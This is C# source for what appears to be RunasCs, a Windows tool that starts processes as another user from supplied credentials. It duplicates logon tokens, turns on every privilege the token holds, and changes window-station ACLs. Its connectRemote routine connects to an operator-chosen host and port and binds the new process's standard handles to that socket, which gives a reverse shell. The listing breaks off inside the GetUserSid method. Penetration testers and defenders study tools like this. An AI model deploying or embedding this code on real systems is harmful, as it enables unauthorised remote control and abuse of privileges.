using System;
using System.Text;
using System.Runtime.InteropServices;
using System.Collections.Generic;
using System.Diagnostics;
using System.Net.Sockets;

public static class RunasCs
{
    private const string error_string = "[-] RunasCsException";
    private const UInt16 SW_HIDE = 0;
    private const Int32 Startf_UseStdHandles = 0x00000100;
    private const int TokenType = 1; //primary token
    private const uint GENERIC_ALL = 0x10000000;
    private const int LOGON32_PROVIDER_DEFAULT = 0; 
    private const uint CREATE_NO_WINDOW = 0x08000000;
    private const uint CREATE_UNICODE_ENVIRONMENT = 0x00000400;
    private const uint SE_PRIVILEGE_ENABLED = 0x00000002;
    private const uint DUPLICATE_SAME_ACCESS = 0x00000002;
    private const int BUFFER_SIZE_PIPE = 1048576;
    
    [StructLayout(LayoutKind.Sequential)]
    private struct LUID 
    {
       public UInt32 LowPart;
       public Int32 HighPart;
    }
    
    [StructLayout(LayoutKind.Sequential, Pack = 4)]
    private struct LUID_AND_ATTRIBUTES 
    {
       public LUID Luid;
       public UInt32 Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct TOKEN_PRIVILEGES
    {
        public UInt32 PrivilegeCount;
        public LUID Luid;
        public UInt32 Attributes;
    }
    
    [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
    struct STARTUPINFO
    {
         public Int32 cb;
         public string lpReserved;
         public string lpDesktop;
         public string lpTitle;
         public Int32 dwX;
         public Int32 dwY;
         public Int32 dwXSize;
         public Int32 dwYSize;
         public Int32 dwXCountChars;
         public Int32 dwYCountChars;
         public Int32 dwFillAttribute;
         public Int32 dwFlags;
         public Int16 wShowWindow;
         public Int16 cbReserved2;
         public IntPtr lpReserved2;
         public IntPtr hStdInput;
         public IntPtr hStdOutput;
         public IntPtr hStdError;
    }

    private struct ProcessInformation
    {
        public IntPtr process;
        public IntPtr thread;
        public int    processId;
        public int    threadId;
    }
    
    [StructLayout(LayoutKind.Sequential)] 
    private struct SECURITY_ATTRIBUTES
    {
        public int    Length;
        public IntPtr lpSecurityDescriptor;
        public bool   bInheritHandle;
    }
    
    private enum SECURITY_IMPERSONATION_LEVEL 
    {
        SecurityAnonymous,
        SecurityIdentification,
        SecurityImpersonation,
        SecurityDelegation
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct SOCKADDR_IN
    {
        public short sin_family;
        public short sin_port;
        public uint sin_addr;
        public long sin_zero;
    }

    [StructLayout(LayoutKind.Sequential)]
    internal struct WSAData
    {
        internal short wVersion;
        internal short wHighVersion;
        internal short iMaxSockets;
        internal short iMaxUdpDg;
        internal IntPtr lpVendorInfo;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 257)]
        internal string szDescription;
        [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 129)]
        internal string szSystemStatus;
    }

    [DllImport("Kernel32.dll", SetLastError=true)]
    private static extern bool CloseHandle(IntPtr handle);
    
    [DllImport("Kernel32.dll", SetLastError=true)]
    private static extern UInt32 WaitForSingleObject(IntPtr handle, UInt32 milliseconds);

    [DllImport("advapi32.dll", SetLastError=true)]
    static extern bool ImpersonateLoggedOnUser(IntPtr hToken);

    [DllImport("advapi32.dll", SetLastError = true)]
    static extern bool RevertToSelf();

    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AdjustTokenPrivileges(IntPtr tokenhandle, bool disableprivs, [MarshalAs(UnmanagedType.Struct)]ref TOKEN_PRIVILEGES Newstate, int bufferlength, int PreivousState, int Returnlength);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern int LookupPrivilegeValue(string lpsystemname, string lpname, [MarshalAs(UnmanagedType.Struct)] ref LUID lpLuid);
    
    [DllImport("advapi32.dll", SetLastError = true, BestFitMapping = false, ThrowOnUnmappableChar = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool LogonUser([MarshalAs(UnmanagedType.LPStr)] string pszUserName,[MarshalAs(UnmanagedType.LPStr)] string pszDomain,[MarshalAs(UnmanagedType.LPStr)] string pszPassword,int dwLogonType,int dwLogonProvider,ref IntPtr phToken);
    
    [DllImport("advapi32.dll", EntryPoint="DuplicateTokenEx")]
    private static extern bool DuplicateTokenEx(IntPtr ExistingTokenHandle, uint dwDesiredAccess, ref SECURITY_ATTRIBUTES lpThreadAttributes, SECURITY_IMPERSONATION_LEVEL ImpersonationLevel, int TokenType, ref IntPtr DuplicateTokenHandle);
    
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    private static extern bool CreateProcessWithLogonW(String userName,String domain,String password,UInt32 logonFlags,String applicationName,String commandLine,uint creationFlags,UInt32 environment,String currentDirectory,ref STARTUPINFO startupInfo,out  ProcessInformation processInformation);
    
    [DllImport("advapi32.dll", SetLastError=true, CharSet=CharSet.Unicode)]
    private static extern bool CreateProcessAsUser(IntPtr hToken,string lpApplicationName,string lpCommandLine, IntPtr lpProcessAttributes, IntPtr lpThreadAttributes,bool bInheritHandles,uint dwCreationFlags,IntPtr lpEnvironment,string lpCurrentDirectory,ref STARTUPINFO lpStartupInfo,out ProcessInformation lpProcessInformation);  

    [DllImport("advapi32", SetLastError = true, CharSet = CharSet.Unicode)]
    private static extern bool CreateProcessWithTokenW(IntPtr hToken, int dwLogonFlags, string lpApplicationName, string lpCommandLine, uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory, [In] ref STARTUPINFO lpStartupInfo, out ProcessInformation lpProcessInformation);
    
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CreatePipe(out IntPtr hReadPipe, out IntPtr hWritePipe, ref SECURITY_ATTRIBUTES lpPipeAttributes, uint nSize);

    [DllImport("kernel32.dll", SetLastError = true)]
    private static extern bool ReadFile(IntPtr hFile, [Out] byte[] lpBuffer, uint nNumberOfBytesToRead, out uint lpNumberOfBytesRead, IntPtr lpOverlapped);

    [DllImport("kernel32.dll", SetLastError=true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool DuplicateHandle(IntPtr hSourceProcessHandle, IntPtr hSourceHandle, IntPtr hTargetProcessHandle, out IntPtr lpTargetHandle, uint dwDesiredAccess, [MarshalAs(UnmanagedType.Bool)] bool bInheritHandle, uint dwOptions);

    [DllImport("userenv.dll", SetLastError=true)]
    static extern bool CreateEnvironmentBlock( out IntPtr lpEnvironment, IntPtr hToken, bool bInherit );

    [DllImport("userenv.dll", SetLastError=true)]
    static extern bool DestroyEnvironmentBlock(IntPtr lpEnvironment);

    [DllImport("userenv.dll", SetLastError=true, CharSet=CharSet.Auto)]
    static extern bool GetUserProfileDirectory(IntPtr hToken, StringBuilder path, ref int dwSize);

    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    internal static extern IntPtr WSASocket([In] AddressFamily addressFamily,
                                            [In] SocketType socketType,
                                            [In] ProtocolType protocolType,
                                            [In] IntPtr protocolInfo,
                                            [In] uint group,
                                            [In] int flags
                                            );

    [DllImport("ws2_32.dll", SetLastError = true)]
    public static extern int connect(IntPtr s, ref SOCKADDR_IN addr, int addrsize);

    [DllImport("ws2_32.dll", SetLastError = true)]
    public static extern ushort htons(ushort hostshort);

    [Obsolete]
    [DllImport("ws2_32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
    public static extern uint inet_addr(string cp);

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto)]
    static extern Int32 WSAGetLastError();

    [DllImport("ws2_32.dll", CharSet = CharSet.Auto, SetLastError=true)]
    static extern Int32 WSAStartup(Int16 wVersionRequested, out WSAData wsaData);
    
    private static string GetProcessFunction(int createProcessFunction){
        if(createProcessFunction == 0)
            return "CreateProcessAsUser()";
        if(createProcessFunction == 1)
            return "CreateProcessWithTokenW()";
        return "CreateProcessWithLogonW()";
    }
    
    private static string EnablePrivilege(string privilege, IntPtr token){
        string output = "";
        LUID sebLuid = new LUID();
        TOKEN_PRIVILEGES tokenp = new TOKEN_PRIVILEGES();
        tokenp.PrivilegeCount = 1;
        LookupPrivilegeValue(null, privilege, ref sebLuid);
        tokenp.Luid = sebLuid;
        tokenp.Attributes = SE_PRIVILEGE_ENABLED;
        if(!AdjustTokenPrivileges(token, false, ref tokenp, 0, 0, 0)){
            output += error_string + "\r\nAdjustTokenPrivileges on privilege " + privilege + " failed with error code: " + Marshal.GetLastWin32Error();
        }
        output += "\r\nAdjustTokenPrivileges on privilege " + privilege + " succeeded";
        return output;
    }
    
    public static string EnableAllPrivileges(IntPtr token)
    {
        string output="";
        output += EnablePrivilege("SeAssignPrimaryTokenPrivilege", token);
        output += EnablePrivilege("SeAuditPrivilege", token);
        output += EnablePrivilege("SeBackupPrivilege", token);
        output += EnablePrivilege("SeChangeNotifyPrivilege", token);
        output += EnablePrivilege("SeCreateGlobalPrivilege", token);
        output += EnablePrivilege("SeCreatePagefilePrivilege", token);
        output += EnablePrivilege("SeCreatePermanentPrivilege", token);
        output += EnablePrivilege("SeCreateSymbolicLinkPrivilege", token);
        output += EnablePrivilege("SeCreateTokenPrivilege", token);
        output += EnablePrivilege("SeDebugPrivilege", token);
        output += EnablePrivilege("SeDelegateSessionUserImpersonatePrivilege", token);
        output += EnablePrivilege("SeEnableDelegationPrivilege", token);
        output += EnablePrivilege("SeImpersonatePrivilege", token);
        output += EnablePrivilege("SeIncreaseBasePriorityPrivilege", token);
        output += EnablePrivilege("SeIncreaseQuotaPrivilege", token);
        output += EnablePrivilege("SeIncreaseWorkingSetPrivilege", token);
        output += EnablePrivilege("SeLoadDriverPrivilege", token);
        output += EnablePrivilege("SeLockMemoryPrivilege", token);
        output += EnablePrivilege("SeMachineAccountPrivilege", token);
        output += EnablePrivilege("SeManageVolumePrivilege", token);
        output += EnablePrivilege("SeProfileSingleProcessPrivilege", token);
        output += EnablePrivilege("SeRelabelPrivilege", token);
        output += EnablePrivilege("SeRemoteShutdownPrivilege", token);
        output += EnablePrivilege("SeRestorePrivilege", token);
        output += EnablePrivilege("SeSecurityPrivilege", token);
        output += EnablePrivilege("SeShutdownPrivilege", token);
        output += EnablePrivilege("SeSyncAgentPrivilege", token);
        output += EnablePrivilege("SeSystemEnvironmentPrivilege", token);
        output += EnablePrivilege("SeSystemProfilePrivilege", token);
        output += EnablePrivilege("SeSystemtimePrivilege", token);
        output += EnablePrivilege("SeTakeOwnershipPrivilege", token);
        output += EnablePrivilege("SeTcbPrivilege", token);
        output += EnablePrivilege("SeTimeZonePrivilege", token);
        output += EnablePrivilege("SeTrustedCredManAccessPrivilege", token);
        output += EnablePrivilege("SeUndockPrivilege", token);
        output += EnablePrivilege("SeUnsolicitedInputPrivilege", token);
        output += EnablePrivilege("SeIncreaseQuotaPrivilege", token);
        return output;
    }
    
    private static bool CreateAnonymousPipeEveryoneAccess(ref IntPtr hReadPipe, ref IntPtr hWritePipe)
    {
        SECURITY_ATTRIBUTES sa = new SECURITY_ATTRIBUTES();
        sa.Length = Marshal.SizeOf(sa);
        sa.lpSecurityDescriptor = IntPtr.Zero;
        sa.bInheritHandle = true;
        if (CreatePipe(out hReadPipe, out hWritePipe, ref sa, (uint)BUFFER_SIZE_PIPE))
            return true;
        return false;
    }
    
    private static string ReadOutputFromPipe(IntPtr hReadPipe){
        string output = "";
        uint dwBytesRead=0;
        byte[] buffer = new byte[BUFFER_SIZE_PIPE];
        if(!ReadFile(hReadPipe, buffer, BUFFER_SIZE_PIPE, out dwBytesRead, IntPtr.Zero)){
            output+="\r\nNo output received from the process.\r\n";
        }
        output += Encoding.Default.GetString(buffer, 0, (int)dwBytesRead);
        return output;
    }

    private static IntPtr connectRemote(string[] remote) {

        int port = 0;
        int error = 0;
        string host = remote[0];

        try {
            port = Convert.ToInt32(remote[1]);
        } catch {
            Console.Out.WriteLine("[-] RunasCs: Specified port is invalid: " + remote[1]);
            System.Environment.Exit(-1);
        }

        WSAData data;
        if( WSAStartup(2 << 8 | 2, out data) != 0 ) {
            error = WSAGetLastError();
            Console.Out.WriteLine(String.Format("[-] RunasCs: WSAStartup failed with error code: {0}", error));
            System.Environment.Exit(-1);
        }

        IntPtr socket = IntPtr.Zero;
        socket = WSASocket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.IP, IntPtr.Zero, 0, 0);

        SOCKADDR_IN sockinfo = new SOCKADDR_IN();
        sockinfo.sin_family = (short)2;
        sockinfo.sin_addr = inet_addr(host);
        sockinfo.sin_port = (short)htons((ushort)port);

        if( connect(socket, ref sockinfo, Marshal.SizeOf(sockinfo)) != 0 ) {
            error = WSAGetLastError();
            Console.Out.WriteLine(String.Format("[-] RunasCs: WSAConnect failed with error code: {0}", error));
            System.Environment.Exit(-1);
        }

        return socket;
    }

    private static bool getUserEnvironmentBlock(IntPtr hToken, out IntPtr lpEnvironment, out string warning) {

        bool success;
        warning = "";
        lpEnvironment = new IntPtr(0);

        success = ImpersonateLoggedOnUser(hToken);
        if(success == false) {
            warning = "[*] Warning: ImpersonateLoggedOnUser failed with error code: " + Marshal.GetLastWin32Error();
            return false;
        }

        success = CreateEnvironmentBlock(out lpEnvironment, hToken, false);
        if(success == false)
        {
            warning = "[*] Warning: lpEnvironment failed with error code: " + Marshal.GetLastWin32Error() + ".\n";
            return false;
        }

        // obtain USERPROFILE value
        int dwSize = 0;
        GetUserProfileDirectory(hToken, null, ref dwSize);
        StringBuilder profileDir = new StringBuilder(dwSize);
        success = GetUserProfileDirectory(hToken, profileDir, ref dwSize);
        if(success == false)
        {
            warning = "[*] Warning: GetUserProfileDirectory failed with error code: " + Marshal.GetLastWin32Error();
            return false;
        }

        // EnvironmentBlock format: Unicode-Str\0Unicode-Str\0...Unicode-Str\0\0.
        // Search for the \0\0 sequence to determine the end of the EnvironmentBlock.
        int count = 0;
        unsafe {
            short *start = (short*)lpEnvironment.ToPointer();
            while( *start != 0 || *(start - 1) != 0 ) {
                count += 2;
                start += 1;
            }
        }

        // copy raw environment to a managed array and free the unmanaged block
        byte[] managedArray = new byte[count];
        Marshal.Copy(lpEnvironment, managedArray, 0, count);
        DestroyEnvironmentBlock(lpEnvironment);

        string environmentString = Encoding.Unicode.GetString(managedArray);
        string[] envVariables = environmentString.Split((char)0x00);

        // Construct new user environment. Currently only USERPROFILE is replaced.
        // Other replacements could be inserted here.
        List<byte> newEnv = new List<byte>();
        foreach( string variable in envVariables ) {

            if( variable.StartsWith("USERPROFILE=") ) {
                newEnv.AddRange(Encoding.Unicode.GetBytes("USERPROFILE=" + profileDir.ToString() + "\u0000"));
            } else {
                newEnv.AddRange(Encoding.Unicode.GetBytes(variable + "\u0000"));
            }
        }

        // finalize EnvironmentBlock. Desired end: \0\0
        newEnv.Add(0x00);
        managedArray = newEnv.ToArray();
        lpEnvironment = Marshal.AllocHGlobal(managedArray.Length);
        Marshal.Copy(managedArray, 0, lpEnvironment, managedArray.Length);

        success = RevertToSelf();
        if(success == false)
        {
            warning = "[*] Warning: RevertToSelf failed with error code: " + Marshal.GetLastWin32Error();
            return false;
        }

        return true;
    }
    
    public static string RunAs(string username, string password, string cmd, string domainName, uint processTimeout, int logonType, int createProcessFunction, string[] remote)
    /*
        int createProcessFunction:
            0: CreateProcessAsUser();
            1: CreateProcessWithTokenW();
            2: CreateProcessWithLogonW();
    */
    {
        bool success;
        string output="";
        string desktopName = "";
        IntPtr hOutputReadTmp = new IntPtr(0);
        IntPtr hOutputRead = new IntPtr(0);
        IntPtr hOutputWrite = new IntPtr(0);
        IntPtr hErrorWrite = new IntPtr(0);
        IntPtr hCurrentProcess = Process.GetCurrentProcess().Handle;
        STARTUPINFO startupInfo = new STARTUPINFO();
        startupInfo.cb = Marshal.SizeOf(startupInfo);
        startupInfo.lpReserved = null;
        ProcessInformation processInfo = new ProcessInformation();
        String commandLine = cmd;
        String processPath = null;
        int sessionId = System.Diagnostics.Process.GetCurrentProcess().SessionId;
        WindowStationDACL stationDaclObj = new WindowStationDACL();
        
        if(processTimeout > 0){
            if (!CreateAnonymousPipeEveryoneAccess(ref hOutputReadTmp, ref hOutputWrite)){
                output += error_string + "\r\nCreatePipe failed with error code: " + Marshal.GetLastWin32Error();
                return output;
            }
            //1998's code. Old but gold https://support.microsoft.com/en-us/help/190351/how-to-spawn-console-processes-with-redirected-standard-handles
            if (!DuplicateHandle(hCurrentProcess, hOutputWrite, hCurrentProcess,out hErrorWrite, 0, true, DUPLICATE_SAME_ACCESS)){
                output += error_string + "\r\nDuplicateHandle stderr write pipe failed with error code: " + Marshal.GetLastWin32Error();
                return output;
            }
            if (!DuplicateHandle(hCurrentProcess, hOutputReadTmp, hCurrentProcess, out hOutputRead, 0, false, DUPLICATE_SAME_ACCESS)){
                output += error_string + "\r\nDuplicateHandle stdout read pipe failed with error code: " + Marshal.GetLastWin32Error();
                return output;
            }
            CloseHandle(hOutputReadTmp);
            startupInfo.dwFlags = Startf_UseStdHandles;
            startupInfo.hStdOutput = (IntPtr)hOutputWrite;
            startupInfo.hStdError = (IntPtr)hErrorWrite;
            processPath = Environment.GetEnvironmentVariable("ComSpec");
            commandLine = "/c " + cmd;

        } else if( remote != null ) {
            IntPtr socket = connectRemote(remote);
            startupInfo.dwFlags = Startf_UseStdHandles;
            startupInfo.hStdInput = socket;
            startupInfo.hStdOutput = socket;
            startupInfo.hStdError = socket;
        }

        desktopName = stationDaclObj.AddAclToActiveWindowStation(domainName, username);
        startupInfo.lpDesktop = desktopName;
        if(createProcessFunction == 2){
            success = CreateProcessWithLogonW(username, domainName, password, (UInt32) 1, processPath, commandLine, CREATE_NO_WINDOW, (UInt32) 0, null, ref startupInfo, out processInfo);
            if (success == false){
                output += error_string + "\r\nCreateProcessWithLogonW failed with " + Marshal.GetLastWin32Error();
                return output;
            }
        }
        else{
            IntPtr hToken = new IntPtr(0);
            IntPtr hTokenDuplicate = new IntPtr(0);
            success = LogonUser(username, domainName, password, logonType, LOGON32_PROVIDER_DEFAULT, ref hToken);
            if(success == false)
            {
                output += error_string + "\r\nWrong Credentials. LogonUser failed with error code: " + Marshal.GetLastWin32Error();
                return output;
            }

            SECURITY_ATTRIBUTES sa  = new SECURITY_ATTRIBUTES();
            sa.bInheritHandle       = true;
            sa.Length               = Marshal.SizeOf(sa);
            sa.lpSecurityDescriptor = (IntPtr)0;
            success = DuplicateTokenEx(hToken, GENERIC_ALL, ref sa, SECURITY_IMPERSONATION_LEVEL.SecurityDelegation, TokenType, ref hTokenDuplicate);
            if(success == false)
            {
                output += error_string + "\r\nDuplicateTokenEx failed with error code: " + Marshal.GetLastWin32Error();
                return output;
            }

            // obtain environmentBlock for desired user
            string warning;
            IntPtr lpEnvironment;
            success = getUserEnvironmentBlock(hTokenDuplicate, out lpEnvironment, out warning);
            if(success == false) {
                Console.Out.WriteLine(warning);
                Console.Out.WriteLine(String.Format("[*] Warning: Unable to obtain environment for user '{0}'.", username));
                Console.Out.WriteLine(String.Format("[*] Warning: Environment of created process might be incorrect.", username));
            }

            //enable all privileges assigned to the token
            if(logonType != 3 && logonType != 8)
                EnableAllPrivileges(hTokenDuplicate);
                
            if(createProcessFunction == 0){
                success = CreateProcessAsUser(hTokenDuplicate, processPath, commandLine, IntPtr.Zero, IntPtr.Zero, true, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, null, ref startupInfo, out processInfo);
                if(success == false)
                {
                    output += error_string + "\r\nCreateProcessAsUser failed with error code : " + Marshal.GetLastWin32Error();
                    return output;
                }
            }
            if(createProcessFunction == 1){
                success = CreateProcessWithTokenW(hTokenDuplicate, 0, processPath, commandLine, CREATE_NO_WINDOW | CREATE_UNICODE_ENVIRONMENT, lpEnvironment, null, ref startupInfo, out processInfo);
                if(success == false)
                {
                    output += error_string + "\r\nCreateProcessWithTokenW failed with error code: " + Marshal.GetLastWin32Error();
                    return output;
                }
            }

            if( lpEnvironment != IntPtr.Zero ) {
                DestroyEnvironmentBlock(lpEnvironment);
            }
            CloseHandle(hToken);
            CloseHandle(hTokenDuplicate);
        }
        if(processTimeout > 0){
            CloseHandle(hOutputWrite);
            CloseHandle(hErrorWrite);
            WaitForSingleObject(processInfo.process, processTimeout);
            output += ReadOutputFromPipe(hOutputRead);
            CloseHandle(hOutputRead);
        }
        else{
            output += "\r\nRunning in session " + sessionId.ToString() + " with process function " + GetProcessFunction(createProcessFunction) + "\r\n";
            output += "\r\nUsing Station\\Desktop: " + desktopName + "\r\n";
            output += "\r\nAsync process '" + commandLine + "' with pid " + processInfo.processId + " created and left in background.\r\n";
        }
        CloseHandle(processInfo.process);
        CloseHandle(processInfo.thread);
        stationDaclObj.CleanupHandles(0);        
        return output;
    }
    
}

public class WindowStationDACL{
   
    private const int UOI_NAME = 2;
    private const int SECURITY_WORLD_RID = 0;
    private const int ERROR_INSUFFICIENT_BUFFER = 122;
    private const uint SECURITY_DESCRIPTOR_REVISION = 1;
    private const uint ACL_REVISION = 2;
    private const uint MAXDWORD = 0xffffffff;
    private const byte ACCESS_ALLOWED_ACE_TYPE = 0x0;
    private const byte CONTAINER_INHERIT_ACE = 0x2;
    private const byte INHERIT_ONLY_ACE = 0x8;
    private const byte OBJECT_INHERIT_ACE = 0x1;
    private const byte NO_PROPAGATE_INHERIT_ACE = 0x4;
    private const int NO_ERROR = 0;
    private const int ERROR_INVALID_FLAGS = 1004; // On Windows Server 2003 this error is/can be returned, but processing can still continue
    
    [Flags]
    private enum ACCESS_MASK : uint
    {
        DELETE = 0x00010000,
        READ_CONTROL = 0x00020000,
        WRITE_DAC = 0x00040000,
        WRITE_OWNER = 0x00080000,
        SYNCHRONIZE = 0x00100000,

        STANDARD_RIGHTS_REQUIRED = 0x000F0000,

        STANDARD_RIGHTS_READ = 0x00020000,
        STANDARD_RIGHTS_WRITE = 0x00020000,
        STANDARD_RIGHTS_EXECUTE = 0x00020000,

        STANDARD_RIGHTS_ALL = 0x001F0000,

        SPECIFIC_RIGHTS_ALL = 0x0000FFFF,

        ACCESS_SYSTEM_SECURITY = 0x01000000,

        MAXIMUM_ALLOWED = 0x02000000,

        GENERIC_READ = 0x80000000,
        GENERIC_WRITE = 0x40000000,
        GENERIC_EXECUTE = 0x20000000,
        GENERIC_ALL = 0x10000000,
        GENERIC_ACCESS = GENERIC_READ | GENERIC_WRITE | GENERIC_EXECUTE | GENERIC_ALL,

        DESKTOP_READOBJECTS = 0x00000001,
        DESKTOP_CREATEWINDOW = 0x00000002,
        DESKTOP_CREATEMENU = 0x00000004,
        DESKTOP_HOOKCONTROL = 0x00000008,
        DESKTOP_JOURNALRECORD = 0x00000010,
        DESKTOP_JOURNALPLAYBACK = 0x00000020,
        DESKTOP_ENUMERATE = 0x00000040,
        DESKTOP_WRITEOBJECTS = 0x00000080,
        DESKTOP_SWITCHDESKTOP = 0x00000100,
        DESKTOP_ALL = (DESKTOP_READOBJECTS | DESKTOP_CREATEWINDOW | DESKTOP_CREATEMENU |
                    DESKTOP_HOOKCONTROL | DESKTOP_JOURNALRECORD | DESKTOP_JOURNALPLAYBACK |
                    DESKTOP_ENUMERATE | DESKTOP_WRITEOBJECTS | DESKTOP_SWITCHDESKTOP |
                    STANDARD_RIGHTS_REQUIRED),

        WINSTA_ENUMDESKTOPS = 0x00000001,
        WINSTA_READATTRIBUTES = 0x00000002,
        WINSTA_ACCESSCLIPBOARD = 0x00000004,
        WINSTA_CREATEDESKTOP = 0x00000008,
        WINSTA_WRITEATTRIBUTES = 0x00000010,
        WINSTA_ACCESSGLOBALATOMS = 0x00000020,
        WINSTA_EXITWINDOWS = 0x00000040,
        WINSTA_ENUMERATE = 0x00000100,
        WINSTA_READSCREEN = 0x00000200,
        WINSTA_ALL =  (WINSTA_ACCESSCLIPBOARD  | WINSTA_ACCESSGLOBALATOMS | 
                   WINSTA_CREATEDESKTOP    | WINSTA_ENUMDESKTOPS      | 
                   WINSTA_ENUMERATE        | WINSTA_EXITWINDOWS       | 
                   WINSTA_READATTRIBUTES   | WINSTA_READSCREEN        | 
                   WINSTA_WRITEATTRIBUTES  | DELETE                   | 
                   READ_CONTROL            | WRITE_DAC                | 
                   WRITE_OWNER)
    }
    
    [Flags] 
    private enum SECURITY_INFORMATION : uint
    {
        OWNER_SECURITY_INFORMATION        = 0x00000001,
        GROUP_SECURITY_INFORMATION        = 0x00000002,
        DACL_SECURITY_INFORMATION         = 0x00000004,
        SACL_SECURITY_INFORMATION         = 0x00000008,
        UNPROTECTED_SACL_SECURITY_INFORMATION = 0x10000000,
        UNPROTECTED_DACL_SECURITY_INFORMATION = 0x20000000,
        PROTECTED_SACL_SECURITY_INFORMATION   = 0x40000000,
        PROTECTED_DACL_SECURITY_INFORMATION   = 0x80000000
    }
    
    private enum ACL_INFORMATION_CLASS
    {
        AclRevisionInformation = 1,
        AclSizeInformation = 2
    }
    
    private enum SID_NAME_USE
    {
        SidTypeUser = 1,
        SidTypeGroup,
        SidTypeDomain,
        SidTypeAlias,
        SidTypeWellKnownGroup,
        SidTypeDeletedAccount,
        SidTypeInvalid,
        SidTypeUnknown,
        SidTypeComputer
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct SidIdentifierAuthority
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 6, ArraySubType = UnmanagedType.I1)]
        public byte[] Value;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACL_SIZE_INFORMATION
    {
        public uint AceCount;
        public uint AclBytesInUse;
        public uint AclBytesFree;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACE_HEADER
    {
        public byte AceType;
        public byte AceFlags;
        public short AceSize;
    }
    
    [StructLayout(LayoutKind.Sequential)]
    private struct ACCESS_ALLOWED_ACE
    {
        public ACE_HEADER Header;
        public ACCESS_MASK Mask;
        public uint SidStart;
    }
    
    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr GetProcessWindowStation();

    [DllImport("user32.dll", SetLastError=true)]
    private static extern bool GetUserObjectInformation(IntPtr hObj, int nIndex,[Out] byte [] pvInfo, uint nLength, out uint lpnLengthNeeded);

    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern IntPtr OpenWindowStation([MarshalAs(UnmanagedType.LPTStr)] string lpszWinSta,[MarshalAs(UnmanagedType.Bool)]bool fInherit, ACCESS_MASK dwDesiredAccess);
    
    [DllImport("user32.dll")]
    private static extern IntPtr OpenDesktop(string lpszDesktop, uint dwFlags, bool fInherit, ACCESS_MASK dwDesiredAccess);
    
    [return: MarshalAs(UnmanagedType.Bool)]
    [DllImport("user32", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern bool CloseWindowStation(IntPtr hWinsta);
    
    [DllImport("user32.dll", SetLastError=true)]
    private static extern bool CloseDesktop(IntPtr hDesktop);
    
    [DllImport("user32.dll", SetLastError = true)]
    private static extern bool SetProcessWindowStation(IntPtr hWinSta);
 
    [DllImport("advapi32.dll")]
    private static extern IntPtr FreeSid(IntPtr pSid);
    
    [DllImport("user32.dll", SetLastError = true)]
	private static extern bool GetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSID, uint nLength, out uint lpnLengthNeeded);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetSecurityDescriptorDacl(IntPtr pSecurityDescriptor, [MarshalAs(UnmanagedType.Bool)] out bool bDaclPresent, ref IntPtr pDacl,[MarshalAs(UnmanagedType.Bool)] out bool bDaclDefaulted);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool GetAclInformation(IntPtr pAcl, ref ACL_SIZE_INFORMATION pAclInformation, uint nAclInformationLength, ACL_INFORMATION_CLASS dwAclInformationClass);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool InitializeSecurityDescriptor(IntPtr SecurityDescriptor, uint dwRevision);

    [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
    private static extern int GetLengthSid(IntPtr pSID);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool InitializeAcl(IntPtr pAcl, uint nAclLength, uint dwAclRevision);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool GetAce(IntPtr aclPtr, int aceIndex, out IntPtr acePtr);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AddAce(IntPtr pAcl, uint dwAceRevision, uint dwStartingAceIndex, IntPtr pAceList, uint nAceListLength);
    
    [DllImport("advapi32.dll", SetLastError = true)]
    private static extern bool AddAccessAllowedAce(IntPtr pAcl, uint dwAceRevision, ACCESS_MASK AccessMask, IntPtr pSid);
    
    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool SetSecurityDescriptorDacl(IntPtr sd, bool daclPresent, IntPtr dacl, bool daclDefaulted);
    
    [DllImport("user32.dll", SetLastError = true)]
	private static extern bool SetUserObjectSecurity(IntPtr hObj, ref SECURITY_INFORMATION pSIRequested, IntPtr pSD);

    [DllImport("advapi32.dll", SetLastError=true)]
    private static extern bool CopySid(uint nDestinationSidLength, IntPtr pDestinationSid, IntPtr pSourceSid);
    
    [DllImport("advapi32.dll", CharSet=CharSet.Unicode, SetLastError = true)]
    private static extern bool LookupAccountName(string lpSystemName, string lpAccountName, [MarshalAs(UnmanagedType.LPArray)] byte[] Sid, ref uint cbSid, StringBuilder ReferencedDomainName, ref uint cchReferencedDomainName, out SID_NAME_USE peUse);
    
    
    private IntPtr hWinsta;
    private IntPtr hDesktop;
    private IntPtr userSid;

    public WindowStationDACL()
    {
        this.hWinsta = IntPtr.Zero;
        this.hDesktop = IntPtr.Zero;
        this.userSid = IntPtr.Zero;
    }
    
    private IntPtr GetUserSid(string domain, string username){
        IntPtr userSid = IntPtr.Zero;
